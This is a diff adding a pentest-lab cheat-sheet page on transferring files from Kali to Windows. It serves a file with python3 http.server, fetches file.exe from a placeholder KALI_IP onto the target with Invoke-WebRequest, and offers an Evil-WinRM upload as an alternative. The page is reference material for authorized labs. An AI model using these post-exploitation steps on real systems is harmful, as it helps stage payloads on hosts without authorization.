@@ -1,0 +1,46 @@
+---
+title: "Kali → Windows file transfer"
+sidebarTitle: "Kali → Windows file transfer"
+description: "Serve a file from Kali and download it on Windows. Requires Windows → Kali TCP 8000."
+keywords: ["linux to windows", "kali to windows", "windows download", "download file", "transfer to windows"]
+boost: 10
+hideFooterPagination: true
+---
+
+{/* Generated from Commands/linux-to-windows.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+Replace UPPER_CASE values with your lab values.
+
+## 1. Kali — from the folder containing the file
+
+**Kali**
+
+```bash
+python3 -m http.server 8000
+```
+
+Keep the server running; serve only the intended transfer folder.
+
+## 2. Windows — save the file
+
+**Windows PowerShell**
+
+```powershell
+Invoke-WebRequest -UseBasicParsing 'http://KALI_IP:8000/file.exe' -OutFile 'C:\Users\Public\file.exe'
+```
+
+## Alternative — if already in Evil-WinRM
+
+**Evil-WinRM prompt**
+
+```bash
+upload ./file.exe C:\Users\Public\file.exe
+```
+
+[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=linux%20to%20windows)
+
+## Learning and original examples
+
+- [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
